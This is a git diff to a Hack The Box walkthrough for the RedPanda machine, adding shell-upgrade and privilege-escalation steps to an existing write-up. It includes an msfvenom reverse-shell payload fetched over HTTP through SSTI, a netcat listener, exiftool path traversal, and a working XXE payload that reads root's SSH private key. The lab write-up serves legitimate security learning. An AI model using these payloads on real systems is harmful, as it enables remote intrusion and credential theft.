@@ -150,7 +150,7 @@ We see that there are stats for two users, one of which has an export function t
 ![Export](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/user_stats_export.gif)
 
 
-After further digging around with the search utility, we find that it may be vulnerable to an SSTI injection. This will allow us to inject a malicous payload into a template, possible allowing us to generate remote code execution on the server side. We test that theory by entering *{7+7} to see a result of 14 in the search query:
+After further digging around with the search utility, we find that it may be vulnerable to an SSTI injection. This will allow us to inject a malicious payload into a template, possible allowing us to generate remote code execution on the server side. We test that theory by entering *{7+7} to see a result of 14 in the search query:
 
 ![SSTI check](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/ssti_check.gif)
 
@@ -165,7 +165,7 @@ Now, let's go about generating a reverse shell. First I create a little elf help
 ```
 $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.xxx.xxx LPORT=443 -f elf > ks.elf #Must supply your IP address (VPN from HTB) for the LHOST parameter
 ```
-Okay so now we have this ks.elf exececutable somewhere on our attaching machine, so we can host an http server in this same directory to access this file from the SSTI:
+Okay so now we have this ks.elf executable somewhere on our attaching machine, so we can host an http server in this same directory to access this file from the SSTI:
 ```
 $ python -m http.server 80 #Make sure this is where your elf binary is
 ```
@@ -174,7 +174,7 @@ Now we set up a netcat listener on our attacking machine to pick up the reverse 
 ```
 $ nc -lvnp 443
 ```
-Then we can send these three commands (through the search bar on the webpage) one at a time to retrieve the msfvenom executable, modify its permissions, and execute it. At which point, we should retrive a reverse shell in our netcat session.
+Then we can send these three commands (through the search bar on the webpage) one at a time to retrieve the msfvenom executable, modify its permissions, and execute it. At which point, we should retrieve a reverse shell in our netcat session.
 
 
 ```
@@ -190,4 +190,115 @@ Here is an example of retrieving the shell in real time.
 
 ![RCE](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/RCE.gif)
 
+
+We have obtained a reverse shell, but we can't run a lot of our basic commands, so let's attempt to upgrade the shell. It looks like there's no python installed, so the typical fashion is not going to work...
+
+![No Python](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/no_python.png)
+
+But it does appear that Python3 is installed, so let's just try and use that, with the following sequence of commands into the reverse shell:
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL-Z
+stty raw -echo
+fg
+export TERM=xterm
+```
+What is happening here is we are using python3 to spawn a pseudo terminal (pty), which will give us a nicer prompt and allow us to run things like `su`, but it still won't correctly handle SIGINT, or perform useful things like tab completion. So we then background the shell with `CTRL-Z` then set our current terminal to use it's stty to send control input through the reverse shell. After that, we foreground the other (reverse) shell, and set our terminal type to match that of our attacking machine. Below is a GIF of completing this process:
+
+![Upgrade Shell](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/upgrade_shell.gif)
+
+We could have grabbed our user flag before upgrading the shell, but nonetheless, this process certainly makes it mush simpler:
+
+
+![User Flag](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/user_flag.png)
+
 ## Priv Esc
+
+Let's see what process are running as root:
+```
+woodenk@redpanda:/home/woodenk$ ps aux | grep root
+root         879  0.0  0.0   2608   592 ?        Ss   15:35   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+root         880  0.0  0.2   9420  4560 ?        S    15:35   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+```
+We also can view what group(s) our user woodenk is a member of:
+```
+woodenk@redpanda:/home/woodenk$ id
+uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
+```
+And perform a quick find to see any files owned by this group we see above "logs":
+
+```
+woodenk@redpanda:/home/woodenk$ find / -group logs 2>/dev/null
+/opt/panda_search/redpanda.log
+/credits
+/credits/damian_creds.xml
+/credits/woodenk_creds.xml
+```
+Let's go and visit this `/opt/panda_search` directory and snoop around a bit.
+
+First let's check where this `redpanda.log` file is being used in `/opt/panda_search`:
+
+![Find redpanda.log](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/find_pandalog.png)
+
+If we view this `RequestInterceptor.java` file, we see that it handles request from the server, and writes information such as : status code, IP address, user agent, and the request uri to the redpanda.log file. Interesting, because initially when I checked `redpanda.log` it was empty, so it's probably periodically cleaned.  
+
+I Transferred pspy over to the target system and noticed a few cron jobs running:
+
+
+![Pspsy cron jobs](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/pspy_cron.png)
+
+Here we see this `/opt/cleanup.sh` along with some java running in `/opt/credit-score` and this `/root/run_credits.sh` script. I'm going to go and check around this `credit-score` directory and check out what it has to offer, and it appears to be a maven built java project. The source file App.java is very interesting as it also seems to be doing something with our `redpanda.log` file, this most certainly will be where we'll find our privesc.  
+
+
+Without cluttering this page with the entire source code, this file appears to read our `redpanda.log file` and checks to see if:
+1. The file path name ends in ".jpg"
+2. Maps some of the data of the log line
+3. Read the metadata of any .jpg posted at `/opt/panda_search/src/main/resources/static` 
+4. Post artist image data to `/credits/` + artist + "_creds.xml"`
+
+Unfortunately, this box retired and was pulled down (I dont have VIP access for retired machines) before I could complete this documentation, but I can use my notes to explain how I rooted the machine from here.
+
+So, in order to exploit root access for this machine, we are going to perform an XML entity injection, in order to grab an ssh key for root. In short, we are going to take an image, use exiftool to modify the artist tag to a new file location. Then we are going to make a fake xml creds page for that artist, and within that page there will be an XXE that spits out the ssh private key for root.
+
+
+If we look into this `/opt/panda_search/src/main/resources/static` directory, we see multiple images in a directory titled `img` . We can grab one of these images by either downloading it directly from the web page in the browser or through an http server.
+
+Once we have one of these images, we can use exiftool to examine some of the images metadata. We see the artists name in a field (mine was damian) and can see that there is indeed an xml file with some stats located at `/credits/damian_creds.xml`
+
+In order to perform our XXE, we are going to manipulate this Artist field to a value that will directory traverse out of this credits directory which we do not have an access to write in. So we take the image and run something like this, on our attacking machine once we've grabbed one of those example photos.
+```
+$exiftool -Artist="../dev/shm/greeb" that_image_we_took.jpg
+$mv that_image_we_took.jpg exploit.jpg
+```
+
+Spawn a web server with python in whatever directory you have this image file in, and grab it from the target machine in the `/dev/shm` directory:
+```
+woodenk@redpanda.htb:~/dev/shm wget 10.10.X.X:8000/exploit.jpg
+```
+
+Okay so we have this image now on the target machine, but now we need to create the xml file that we will use for the injection. Copy one of the xml files located in `/credits/` into your `dev/shm` (or whatever writeable directory you have chosen) and name it `greeb_creds.xml` (or `your_artist_name_creds.xml`) Now, add the lines necessary to print `/root/.ssh/id_rsa` to output. This is relatively simple, there are plenty of examples of XXE posted online. After editing, your xml file should look something like this:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
+<credits>
+  <author>greeb</author>
+  <image>
+    <uri>/../../../../../../dev/shm/exploit.jpg</uri>
+    <views>1</views>
+    <foo>&xxe;</foo>
+  </image>
+  <totalviews>2</totalviews>
+</credits>
+```
+Note that the directory traversal for the uri looks different than that for the xml page. This is because the uri is traversing out of `/opt/panda_search/src/main/resources/static` while the xml is traversing out of `/credits/`
+
+The last step is to add a line to the `redpanda.log` file which will allow the cron job running to begin the process of accessing the image at `/dev/shm` then traversing to xml credits page associated with it's author and update the xml data to the view. After a minute or two, check the xml file at `/dev/shm/greeb_creds.xml` and you should have the root ssh key.
+
+Once you have the key, copy it back to your attacking machine. Don't forget to give it the ol' `chmod 600` and log in to grab your root flag.
+
+```
+$ chmod 600 ./root_key.txt
+$ ssh root@10.129.31.193 -i root_key.txt
+```
